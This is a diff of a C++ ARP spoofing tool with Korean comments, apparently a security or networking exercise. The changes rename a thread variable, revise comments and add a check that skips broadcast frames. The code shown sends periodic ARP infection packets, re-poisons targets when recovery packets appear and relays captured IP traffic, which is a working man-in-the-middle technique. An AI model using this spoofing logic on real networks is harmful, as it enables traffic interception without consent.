@@ -49,8 +49,8 @@ int main(int argc, char* argv[]) {
 		printf("target mac = %s\n",std::string(targetmac[i]).data());
 
 		//3.공격패킷을 주기적으로 전송하는 쓰레드 생성
-		std::thread arp_spoof_thread (send_arp_infection_packet_thread,dev,targetip[i],sendermac[i],senderip[i],i);
-		arp_spoof_thread.detach();
+		std::thread t (send_arp_infection_packet_thread,dev,targetip[i],sendermac[i],senderip[i],i);
+		t.detach();
 	}
 	
 	/*
@@ -69,21 +69,24 @@ int main(int argc, char* argv[]) {
 		struct EthHdr *ethhdr = (struct EthHdr *) (packet);
 
 
-		//모든 flow를 하나씩 비교해 가면서 packet relay 여부를 판단
+		//모든 flow를 하나씩 비교해 가면서 packet relay를 해야하는지 판단
 		for(int i=1;i<=flows;i++){
 			
-			//1. ARP패킷이 잡힌 경우 recovering여부를 판단해서 재선송
+			//1. ARP패킷이 잡힌 경우 recovering여부를 판단
 			if(ntohs(ethhdr->type_)==EthHdr::Arp && is_recovering(packet,sendermac[i],targetmac[i],targetip[i])){
-					printf("[%d] recis_recovering packet captured\n",i);
+					printf("[%d] recovering packet captured\n",i);
 					send_arp_infection_packet(handler,targetip[i],sendermac[i],senderip[i],i);
 					break;
 			}
 
 
-			//2. smac이 sender가 아닌 경우는 relay할 필요가 없으므로  contiune
+			//2. smac이 sender가 아닌 경우는 relay 필요 X
 			if(ethhdr->smac_!=sendermac[i]) continue;
 
-			//3. IP패킷이 잡힌 경우 relay
+			//3. dmac이 broadcast인 경우 relay 필요 X
+			if(ethhdr->dmac_==bcast)	continue;	
+
+			//4. IP패킷이 잡힌 경우 relay
 			if(ntohs(ethhdr->type_)==EthHdr::Ip4) {
 				struct my_ipv4_hdr *iphdr = (struct my_ipv4_hdr *) (ethhdr+1);
 				uint32_t pktlen = sizeof(struct EthHdr) + ntohs(iphdr->ip_len);
